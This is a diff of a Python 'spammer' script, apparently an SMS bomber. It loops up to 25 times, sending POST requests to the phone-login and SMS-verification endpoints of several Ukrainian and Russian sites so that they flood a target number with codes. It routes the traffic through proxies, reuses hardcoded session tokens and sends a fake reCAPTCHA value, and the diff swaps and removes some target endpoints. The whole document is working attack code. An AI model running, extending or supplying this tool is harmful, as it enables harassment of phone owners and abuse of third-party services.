@@ -51,10 +51,10 @@ else:
 run = int(console.input('[green]Введите количество повторов (1-25):\n[blue]spammer>> '))
 for _ in track(range(run)):
  try:
-         requests.post("https://sex-shop.ua/bitrix/components/bxmaker/authuserphone.login/ajax.php", json={"parameters": "YToxOntzOjEwOiJDQUNIRV9UWVBFIjtzOjE6IkEiO30=.886837943a18715db75ae7fe96ae97183ca0be0637a0bc22ca3ba8d04e55b81f", "template": ".default.0439327cbb51aa71d187d378db240bf43d3133d2e235a6d74509561d345ec422", "siteId": "s1", "sessid": "0a9ac0c10c9a95be2f198a73a5ab8fb6", "method": "sendCode", "phone": "+" + number}, headers=headers, proxies=proxies)
-         print('sex-shop.ua')
+         requests.post("https://kumo.com.ua/registration/sms/", data={"phone": "+" + number, "_token": "bXjwBMo8eSTiyWpex3QEOqwblgWabMYTPK2uyZ7m", "g-recaptcha-response": "1"}, headers=headers, proxies=proxies)
+         print('kumo.com.ua')
  except:
-         print('Не отправлено (sex-shop.ua)')
+         print('Не отправлено (kumo.com.ua)')
  try:
          requests.post("https://my.ctrs.com.ua/api/auth/login", data={"provider": "phone", "identity": number}, headers=headers, proxies=proxies)#https://www.citrus.ua/?gclsrc=aw.ds&gclid=CjwKCAiAs92MBhAXEiwAXTi253UnT0-Ws93B3drlp81h97IFAOzTqmkLJLEStUktScA14Vu5Jn8AShoCS-UQAvD_BwE
          print('my.ctrs.com')
@@ -161,19 +161,3 @@ for _ in track(range(run)):
          print('money4you.ua')
  except:
          print('Не отправлено (money4you.ua)')
- try:
-         formatted_phone = format_phone(number, "+###+##+###+##+##")
-         requests.post("https://kumo.com.ua/registration/sms/", data={"phone": "+" + number, "_token": "bXjwBMo8eSTiyWpex3QEOqwblgWabMYTPK2uyZ7m", "g-recaptcha-response": "1"}, headers=headers, proxies=proxies)
-         print('kumo.com.ua')
- except:
-         print('Не отправлено (kumo.com.ua)')
- try:
-         requests.post("https://api.01.hungrygator.ru/web/auth/webotp", json={"fu": "tralala", "userLogin": "+" + number}, headers=headers, proxies=proxies)
-         print('hungrygator.ru')
- except:
-         print('Не отправлено (hungrygator.ru)')
- try:
-         requests.post("https://sex-shop.ua/bitrix/components/bxmaker/authuserphone.login/ajax.php", data={"parameters": "YToxOntzOjEwOiJDQUNIRV9UWVBFIjtzOjE6IkEiO30=.886837943a18715db75ae7fe96ae97183ca0be0637a0bc22ca3ba8d04e55b81f", "template": ".default.0439327cbb51aa71d187d378db240bf43d3133d2e235a6d74509561d345ec422", "siteId": "s1", "sessid": "48add65add0e6c591d7aae265c20b0db", "method": "sendCode", "phone": "+" + number, "regustration": "Y"}, headers=headers, proxies=proxies)
-         print('sex-shop.ua')
- except:
-         print('Не отправлено (sex-shop.ua)')
